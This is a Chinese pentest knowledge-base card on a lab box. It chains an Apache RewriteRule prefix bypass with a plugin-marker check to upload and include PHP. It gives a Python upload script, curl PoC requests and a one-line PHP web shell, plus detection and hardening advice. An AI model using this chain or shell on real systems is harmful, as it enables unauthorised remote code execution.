---
id: web-php-file-inclusion-addon-manager-rewrite-marker-bypass
title: RewriteRule 前缀绕过 + 插件标记行：恢复被禁用的上传并包含 PHP
type: scenario
domain: web
path: web/php/file-inclusion
technique: rewrite-prefix-plugin-include-bypass
tags:
- php
- htaccess
- mod-rewrite
- file-upload
- file-inclusion
- rce
- bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V64
  verified_at: '2026-11-05T12:10:18+08:00'
  notes: '已对照原文源码与图12-17核对：.htaccess 注释了 upload 的 RewriteRule 但保留 download；REQUEST_URI 正则 /\/addon-upload.php/ 与 ^addon-download.php 前缀重写叠加，/addon-download.php/addon-upload.php 命中上传分支；上传仅 20KB 大小检查+basename，move_uploaded_file 落 addons/；menu.php 读第二行需等于 # OneTwoSeven Admin Plugin 才 require_once；补标记后 shell2.php 执行 id=uid=35(www-admin-data)（图17）。未验证点：PoC 未本机复跑；原文为 HTB 靶场，无版本；卡内 PATH_INFO/%2f 等变体为通用推测未实测。'
url: /docs/web/php/file-inclusion/web-php-file-inclusion-addon-manager-rewrite-marker-bypass/
draft: false
kb_aliases:
- RewriteRule 前缀绕过
- addon-download.php/addon-upload.php
- 被注释的 RewriteRule 绕过
- 插件标记行绕过
- OneTwoSeven addon manager RCE
- 上传后 require_once
---

## 一句话结论

管理员用“注释掉 RewriteRule”来禁用上传功能并不可靠：访问 `/addon-download.php/addon-upload.php` 时，Apache 按前缀 `^addon-download.php` 重写到同一个 PHP 管理器，而管理器用 `preg_match('/\/addon-upload.php/', REQUEST_URI)` 判断分支，完整 URI 仍匹配上传分支；再给上传的 PHP 文件第二行加上 `# OneTwoSeven Admin Plugin` 标记，就能通过 `require_once` 包含并执行。

## 原理

- `.htaccess` 中通常有两条重写：
  ```apache
  # RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]
  RewriteRule ^addon-download.php addons/ots-man-addon.php [L]
  ```
  上传规则被注释，直接访问 `/addon-upload.php` 返回 404；下载规则生效。
- Apache 的 `RewriteRule ^addon-download.php` 是**前缀匹配**：请求 `/addon-download.php/addon-upload.php` 也以 `addon-download.php` 开头，因此仍被重写到 `addons/ots-man-addon.php`。
- 后端 PHP 用 `preg_match('/\/addon-upload.php/', $_SERVER['REQUEST_URI'])` 选择分支；`REQUEST_URI` 是完整原始 URI（`/addon-download.php/addon-upload.php`），其中包含 `/addon-upload.php`，所以 `switch` 命中上传分支，而不是下载分支。
- 上传分支只检查大小（20KB）并用 `basename()` 取文件名，`move_uploaded_file` 到 `addons/` 目录，没有后缀/内容校验；因此可以上传 PHP 文件。
- 包含分支（`menu.php?addon=...`）先用 `basename()` 防目录穿越，再读取 `addons/<file>` 的第二行，要求等于 `# OneTwoSeven Admin Plugin`，满足后 `require_once` 执行。把该标记放在上传 PHP 的第二行即可通过检查，形成完整 RCE。

## 触发条件

- 应用使用 Apache + mod_rewrite，`.htaccess` 中用注释 RewriteRule 的方式“禁用”功能。
- 重写规则是前缀匹配，且后端用 `REQUEST_URI` 的子串/正则选择分支，两者对“路径”的解析不一致。
- 上传分支仍可被触发，且上传目录在 `include`/`require` 路径下（或可预测）。
- 包含逻辑存在可满足的标记/类型校验，且标记可从源码泄露、报错或猜测中获得。

## 利用步骤

1. 读取 `.htaccess` 或管理页提示，确认重写规则与“上传被禁用”的实现方式。
2. 构造同时匹配下载前缀和上传正则的路径：
   ```text
   /addon-download.php/addon-upload.php
   ```
3. 用该路径 POST 上传 PHP 文件（前端 disabled 按钮可直接改表单或写脚本）：
   ```python
   import requests
   url = 'http://127.0.0.1:60080/addon-download.php/addon-upload.php'
   with open('shell.php', 'r') as f:
       requests.post(url, files={'addon': ('shell.php', f, 'text/plain')},
                     cookies={'PHPSESSID': '<session>'})
   ```
4. 上传文件内容需满足包含校验（第二行是标记）：
   ```php
   <?php
   # OneTwoSeven Admin Plugin
   system($_REQUEST['bash']);
   ?>
   ```
5. 通过包含入口执行：
   ```text
   /menu.php?addon=addons/shell.php&bash=id
   ```
6. 反弹 shell 或继续提权。

## PoC

```bash
# 上传（路径同时满足下载 RewriteRule 前缀与上传分支正则）
curl -X POST 'http://127.0.0.1:60080/addon-download.php/addon-upload.php' \
  -H 'Cookie: PHPSESSID=<session>' \
  -F 'addon=@shell.php;type=text/plain'

# 包含执行
curl 'http://127.0.0.1:60080/menu.php?addon=addons/shell.php&bash=id' \
  -H 'Cookie: PHPSESSID=<session>'
```

```php
<?php
# OneTwoSeven Admin Plugin
system($_REQUEST['bash']);
?>
```

## 变体与关联

- 变体：`addon-download.php/../addon-upload.php`、`addon-download.php%2faddon-upload.php`、`PATH_INFO` 等路径变形，取决于 Apache/PHP 的 URI 解析。
- 变体：其他“注释 RewriteRule 禁用功能”的场景，可用类似前缀/后缀路径重新命中被禁用的分支。
- 变体：标记行可通过源码泄露（Vim swap、软链接读源码）获得；也可尝试常见插件头格式。
- 关联：[[pentest-initial-access-sftp-symlink-chroot-escape]]（读取 `.htaccess`/源码）、[[pentest-recon-vim-swap-file-source-recovery]]（读取源码获得标记行）、[[web-php-file-inclusion-htaccess-self-include-dirty-bypass]]（另一种 .htaccess 包含绕过）。
- 边界：Apache 使用 `$` 锚定或 `END`、后端用 `parse_url` 严格校验 path、上传目录不在 include 路径、或标记校验不可满足时，链失效。

## 检测与防御

- 检测：请求路径出现 `/addon-download.php/addon-upload.php` 这类“合法前缀 + 敏感后缀”；上传目录出现 PHP 文件；`require_once` 包含上传目录文件；Web 日志中同一会话先上传后访问 `?addon=`。
- 修复：不要用注释 RewriteRule 作为安全边界；在 PHP 内对上传/下载功能做独立鉴权与严格 `REQUEST_URI` 校验；上传目录移出 include 路径并禁止执行。
- 加固：上传只允许白名单类型并重命名；包含逻辑使用固定白名单映射，不直接包含用户上传文件；对管理功能加 MFA/来源限制；监控上传目录与包含行为。
